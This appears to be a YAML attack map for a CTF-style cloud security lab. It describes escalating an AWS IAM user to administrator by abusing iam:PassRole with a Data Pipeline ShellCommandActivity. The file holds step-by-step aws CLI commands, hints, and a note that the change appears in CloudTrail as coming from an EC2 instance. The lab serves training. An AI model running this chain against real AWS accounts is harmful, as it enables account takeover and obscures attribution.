attackMap:
  nodes:
  - id: starting-user
    label: Starting User
    type: principal
    subType: iam-user
    arn: arn:aws:iam::{account_id}:user/pl-prod-datapipeline-001-to-admin-starting-user
    access:
      type: assumed-breach-credentials
    description: 'You have gained access to this principal''s AWS IAM credentials. These could have been obtained through
      many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session,
      exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding
      them hardcoded in source code or a CI/CD pipeline.

      Regardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole on an administrative
      role plus datapipeline:CreatePipeline, datapipeline:PutPipelineDefinition, and datapipeline:ActivatePipeline permissions.

      '
  - id: pipeline-role
    label: Admin Pipeline Role
    type: principal
    subType: iam-role
    isAdmin: true
    arn: arn:aws:iam::{account_id}:role/pl-prod-datapipeline-001-to-admin-pipeline-role
    description: 'This IAM role has administrative permissions and can be passed to AWS Data Pipeline EC2 resources via iam:PassRole.
      When an EC2 instance is launched by the pipeline with this role attached, commands executed on that instance run with
      the role''s elevated permissions, completing the privilege escalation.

      '
  - id: flag
    label: CTF Flag
    type: resource
    subType: ssm-parameter
    isTarget: true
    arn: arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/datapipeline-001-to-admin
    description: 'The CTF flag stored in SSM Parameter Store. This parameter is readable by any principal with ssm:GetParameter
      on this ARN. After attaching AdministratorAccess to the starting user via the pipeline, you have the permissions required
      to retrieve this flag.

      '
  edges:
  - from: starting-user
    to: pipeline-role
    label: datapipeline:CreatePipeline + PutPipelineDefinition + iam:PassRole
    description: 'Create a Data Pipeline and define it with a ShellCommandActivity, passing the admin role to the pipeline''s
      EC2 resource via iam:PassRole.

      '
    hints:
    - Create a pipeline with a ShellCommandActivity that calls iam:AttachUserPolicy to attach AdministratorAccess to the starting
      user, passing the admin role via the ec2Resource's 'role' and 'resourceRole' fields. The sequence is CreatePipeline,
      PutPipelineDefinition, then ActivatePipeline.
    - The EC2 instance won't spin up until you call ActivatePipeline -- the IAM change will appear in CloudTrail as originating
      from the EC2 instance, not your user.
    - Browse to https://pathfinding.cloud/paths/datapipeline-001 for full technique details.
    commands:
    - description: Create a new Data Pipeline
      command: aws datapipeline create-pipeline --name pl-privesc-pipeline --unique-id pl-privesc-$(date +%s)
    - description: Define the pipeline with a malicious ShellCommandActivity
      command: aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> --pipeline-objects file://pipeline-definition.json
    - description: Activate the pipeline to trigger execution
      command: aws datapipeline activate-pipeline --pipeline-id <pipeline-id>
    - description: Command run by the EC2 instance via ShellCommandActivity
      command: aws iam attach-user-policy --user-name pl-prod-datapipeline-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    - description: Verify administrator access after pipeline completes
      command: aws iam list-attached-user-policies --user-name pl-prod-datapipeline-001-to-admin-starting-user
  - from: pipeline-role
    to: flag
    label: ssm:GetParameter
    description: 'With AdministratorAccess now attached to the starting user (granted via the pipeline role), use those credentials
      to read the CTF flag from SSM Parameter Store.

      '
    commands:
    - description: Retrieve the CTF flag from SSM Parameter Store
      command: aws ssm get-parameter --name /pathfinding-labs/flags/datapipeline-001-to-admin --query 'Parameter.Value' --output
        text
    hints:
    - Use ssm:GetParameter with the flag parameter name shown in the target node ARN to retrieve the CTF flag value.
